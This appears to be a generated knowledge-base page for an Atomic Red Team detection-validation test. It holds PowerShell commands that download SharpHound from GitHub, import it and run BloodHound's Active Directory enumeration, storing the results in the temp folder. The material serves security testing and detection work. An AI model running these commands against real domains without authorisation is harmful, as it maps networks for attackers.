---
atomic_guid: "a21bb23e-e677-4ee7-af90-6931b57b6350"
title: "Run BloodHound from local disk"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.001"
attack_technique_name: "Command and Scripting Interpreter: PowerShell"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "a21bb23e-e677-4ee7-af90-6931b57b6350"
  - "Run BloodHound from local disk"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Run BloodHound from local disk

Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.

Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.

## Metadata

- Atomic GUID: a21bb23e-e677-4ee7-af90-6931b57b6350
- Technique: T1059.001: Command and Scripting Interpreter: PowerShell
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1059.001/T1059.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.001]]

## Dependencies

SharpHound.ps1 must be located at "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
```

## Executor

- name: powershell

### Command

```powershell
import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5
```

### Cleanup

```powershell
Remove-Item $env:Temp\*BloodHound.zip -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml)
